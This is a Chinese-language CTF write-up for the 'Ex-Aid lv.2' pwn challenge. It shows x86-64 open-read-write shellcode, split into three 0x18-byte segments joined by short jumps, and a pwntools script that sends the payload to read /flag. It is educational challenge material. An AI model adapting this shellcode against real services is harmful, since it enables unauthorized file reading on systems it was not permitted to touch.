# Ex-Aid lv.2

## 题目简述

程序提供三个可执行 shellcode 槽，每段有效空间只有 `0x18` 字节，并且相邻段在实际映射中存在空隙。目标是在极短空间内完成 ORW：打开 `/flag`、读取内容并写到标准输出。

源仓库只保留了官方利用脚本，没有本题源码、ELF 或沙箱规则，因此无法确认 RELRO、canary、NX、PIE 或精确输入函数。脚本能够证明服务会执行用户 shellcode，且三段之间需要显式短跳转；本文不据此猜测缺失的保护项。

## 解题过程

### 把 ORW 切成三段

官方脚本把每段代码填充到 `0x16` 字节，再在末尾放置两字节短跳转：

```python
part = asm(code).ljust(0x16, b"\x90") + asm("jmp $+0xa")
```

`jmp $+0xa` 编码为相对短跳转。指令本身占两字节，因此实际跳过其后的 8 字节空隙，到达下一块 `0x18` 字节代码槽。三段输入总长为：

$$
3\times 0x18=0x48
$$

第一段只负责把 `/flag\0` 压栈。立即数 `0x67616c662f` 按小端序落在内存中即为 `/flag`，高位自动补零：

```assembly
mov rax, 0x67616c662f
push rax
```

第二段令 `rdi=rsp` 指向路径，清空 `rsi` 与 `rdx`，执行 `open`：

```assembly
push rsp
pop rdi
xor rsi, rsi
xor rdx, rdx
push SYS_open
pop rax
syscall
```

第三段复用 `open` 返回的文件描述符和当前栈空间。先读 `0x50` 字节到栈，再把同一缓冲区写到 fd 1：

```assembly
push rax
pop rdi
push rsp
pop rsi
push 0x50
pop rdx
push SYS_read
pop rax
syscall

push 1
pop rdi
push SYS_write
pop rax
syscall
```

### 精简后的 payload 生成器

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"

parts = [
    """
        mov rax, 0x67616c662f
        push rax
    """,
    """
        push rsp; pop rdi
        xor rsi, rsi
        xor rdx, rdx
        push SYS_open; pop rax
        syscall
    """,
    """
        push rax; pop rdi
        push rsp; pop rsi
        push 0x50; pop rdx
        push SYS_read; pop rax
        syscall
        push 1; pop rdi
        push SYS_write; pop rax
        syscall
    """,
]

payload = b"".join(
    asm(code).ljust(0x16, b"\x90") + asm("jmp $+0xa")
    for code in parts
)
assert len(payload) == 0x48

io = remote(args.HOST, int(args.PORT)) if args.REMOTE else process("./checkin")
io.send(payload)
io.interactive()
```

官方材料没有保存实际运行输出或 flag，只能确认脚本的寄存器传递、三段长度和 ORW 数据流是自洽的。

## 方法总结

- 核心技巧：把 ORW 按“准备路径 / open / read+write”拆分，用短跳转跨过离散代码槽之间的空隙。
- 识别信号：题目给多个极短可执行输入块时，应先计算块间实际地址差，而不是简单拼接 shellcode。
- 复用要点：尽量用 `push/pop` 代替长立即数形式，并复用 `open` 返回的 `rax`、已有 `rsp` 缓冲区和 `read` 留下的 `rdx`，减少每段字节数。
